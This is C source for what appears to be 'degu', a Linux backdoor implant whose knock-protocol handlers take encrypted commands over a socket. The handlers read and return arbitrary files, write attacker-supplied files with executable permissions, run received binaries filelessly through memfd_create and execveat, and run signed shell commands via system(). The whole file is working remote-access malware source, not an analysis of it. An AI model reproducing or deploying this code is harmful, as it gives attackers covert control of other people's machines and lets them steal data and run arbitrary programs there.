#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>


#include "degu.h"

unsigned int is_kernel_ok(){
    struct utsname curkernel;
    int rut =  uname(&curkernel);

    if(rut == -1)
        return 0;

    char *major = strtok(curkernel.release,".");
    char *minor = strtok(NULL,".");
    int imaj = atoi(major);
    int imin = atoi(minor);

    if (imaj < 3 )
        return 0;

    if (imaj > 3 )
        return 1;

    if( imaj == 3 && imin >= 17 )
        return 1;

    return 0;

}

int degu_memfd_create(char *name, int flags){

    int ret = -1;

    if (is_kernel_ok()){
        ret = syscall(319, name, flags);
    }else{
        char file[] = "/dev/shm/.XXXXXX";
        ret = mkstemp(file);
        fchmod(ret, 0755);
        unlink(file);
        TRACE("memfd fallback %s fd=%i ", file, ret);
    }

   return ret;
}

int degu_execveat(int dirfd, char *pathname,char *argv[],
                  char *envp[], int flags){

    int ret = -1;

    if (is_kernel_ok()){
        ret = syscall(322, dirfd, pathname, argv, envp, flags);
    }

    if (ret == -1){
        char cmd[4096] = {0};
        sprintf(cmd,"/proc/%i/fd/%i",getpid(),dirfd);
        TRACE("exec fallback %s ",cmd);
        ret = execve(cmd, argv, envp);
    }

   return ret;
}


//|Oo<<|lenpath*4|path
void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
    unsigned char *cur = header + 4;

    int i;
    ssize_t lpath = cur[0] | (cur[1] << 8)
                | (cur[2] << 16) | (cur[3] << 24);

    ssize_t total_len = lpath + 4 + 4; // magic + len + str

    TRACE("in dl path total_len = %i len path = %i", total_len, lpath);

    if (total_len < 32)
        total_len = 32;

    unsigned char *payload = malloc( total_len * sizeof *payload );

    if(payload == NULL){
        return;
    }

    int r=0;
    while ( r < total_len ){
        i = recv(sock, payload + r, 32, 0);
        if(i == -1) break;
        r+=i;
    }

    xcrypt_data(secret, payload, total_len);

    char *path = malloc(lpath + 1);

    memset(path, 0, lpath + 1);
    memcpy(path, payload + 8, lpath);

    TRACE("dl %s", path);
    int file = open(path, O_RDONLY);

    if( file < 0 ){
        free(payload);
        return; // send 404 ?
    }

    struct stat file_stat;
    int res = stat(path, &file_stat);

    TRACE("file_stat.st_size = %i res = %i ",file_stat.st_size, res);

    unsigned char flen[4];
    flen[0] = (file_stat.st_size >> 24) & 0xFF;
    flen[1] = (file_stat.st_size >> 16) & 0xFF;
    flen[2] = (file_stat.st_size >> 8) & 0xFF;
    flen[3] = file_stat.st_size & 0xFF;

    unsigned int delta = 32 - ((file_stat.st_size + 4 ) % 32);

    unsigned char *response = malloc( file_stat.st_size + 4 + delta );

    memcpy(response, flen, 4);
    res = read(file, response + 4, file_stat.st_size);
    memset(response + 4 + file_stat.st_size , 0, delta);
    ssize_t reslen = file_stat.st_size + 4 + delta;
    TRACE("total len = %i ",reslen);

    xcrypt_data(secret, response, reslen);

    send(sock, response, reslen, 0);

    close(file);
    free(payload);
    free(path);
    free(response);

}

//|Oo>>|lendata*4|lenpath*4|path|data
void knock_handle_up(int sock,unsigned  char *header,unsigned char *secret){

    unsigned char *cur = header + 4;

    ssize_t ldata = cur[0] | (cur[1] << 8)
                | (cur[2] << 16) | (cur[3] << 24);

    cur += 4;

    ssize_t lpath = cur[0] | (cur[1] << 8)
                | (cur[2] << 16) | (cur[3] << 24);

    cur += 4;
    // header + lendata + lenpath == 12
    ssize_t total_len = ldata + lpath + 12;

    if (total_len < 32)
        total_len = 32;
    TRACE("total len %i ldata %i lpath %i", total_len, ldata, lpath );

    unsigned char *payload = malloc(total_len * sizeof *payload + 1);

    if(payload == NULL){
        return;
    }

    int r=0;
    int i;

    while ( r < total_len ){
        i = recv(sock, payload + r, 32, 0);
        if(i == -1) break;
        r+=i;
    }

    xcrypt_data(secret, payload, total_len);

    char *path = malloc(lpath * sizeof *path + 1 );

    memset(path, 0, lpath + 1);

    memcpy(path, cur, lpath);

    cur += lpath;

    TRACE("up file = %s len data %i", path, ldata);

    int fd = open(path, O_CREAT|O_WRONLY, 0755);
    if ( fd < 0 ){
        free(payload);
        free(path);
        return;
    }
    write( fd, payload + 12 + lpath, ldata);
    close(fd);

    free(payload);
    free(path);
}

//|<o)~|len*4|lenargv*4|argc|argv|data
void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){

        unsigned char *cur = header + 4;
        int i;
        ssize_t lbin = cur[0] | (cur[1] << 8)
                    | (cur[2] << 16) | (cur[3] << 24);

        cur += 4;

        ssize_t largv = cur[0] | (cur[1] << 8)
                    | (cur[2] << 16) | (cur[3] << 24);

        cur += 4;

        unsigned char argc = cur[0];

        // 13 == header + lenbin + lenargv + argc(<255)
        ssize_t total_len = lbin + largv + 13;
        unsigned char *payload = malloc( total_len * sizeof *payload );

        if(payload == NULL)
            return;

        int r=0;

        while ( r < total_len ){
            i = recv(sock, payload + r, 32, 0);
            if(i == -1) break; // XXX test exe consistence
            r+=i;
        }

        xcrypt_data(secret, payload, total_len);

        unsigned char *bin = payload + 13 + largv;

        TRACE("exelen %i argvlen %i argc %x",lbin, largv, argc);

        cur += 1;
        char * str_argv = malloc((largv + 1) * sizeof *str_argv);

        memset(str_argv, 0, largv + 1);
        memcpy(str_argv, payload + 13, largv); // skip first 13 bytes of header for argv

        //ugliest way to get argv didn't found worst way
        char **argv = NULL;
        int index = 0;
        char *tok = strtok(str_argv, " ");

        while(tok != NULL) {
            argv = realloc(argv, sizeof(char*) * (index + 1) );
            char *dup = malloc(strlen(tok) + 1);
            strcpy(dup, tok);
            argv[index++] = dup;
            tok = strtok(NULL, " ");
        }
        argv = realloc(argv, sizeof(char*)*(index+1));
        argv[index] = NULL;

        int fd = degu_memfd_create("", 1);
        int written = write(fd, bin, lbin);


        pid_t pid = -1;

        pid = fork();
        if(pid == -1){
            TRACE("fork error");
            return;
        }
        if(pid == 0){
            TRACE("fd=%i written %i pid=%i", fd, written, getpid() );
            int ret = degu_execveat(fd, "", argv, NULL, 0x1000); // persistant after father process died TODO
            TRACE("exec result : %i : %s", ret, strerror(errno) );
            close(fd);
            exit(EXIT_SUCCESS);
        }else
            signal(SIGCHLD,SIG_IGN);

        free(payload);
        free(str_argv);
        close(fd);
}


//rand[32]|len[2]|cmd[len]|sig[64]

void knock_ghost_exe(unsigned  char *buffer, size_t len){

    unsigned char *cmd = malloc( len + 1 ) ;
    unsigned char *sig = malloc( 64 );
    memset(cmd, 0, len + 1 );
    memcpy(cmd, buffer, len );
    memcpy(sig, buffer + len, 64 );

    unsigned int sigok = xvrfy(sig, cmd, len);

    if(sigok){
        TRACE("ghost exe : len %i cmd %s" , len, cmd);
        pid_t pid = -1;

        pid = fork();
        if(pid == -1){
            TRACE("fork error");
            return;
        }
        if(pid == 0){
            system((char*)cmd);
            exit(EXIT_SUCCESS);
        }else
            signal(SIGCHLD,SIG_IGN);
        return;
    }

    free(cmd);
    free(sig);
}
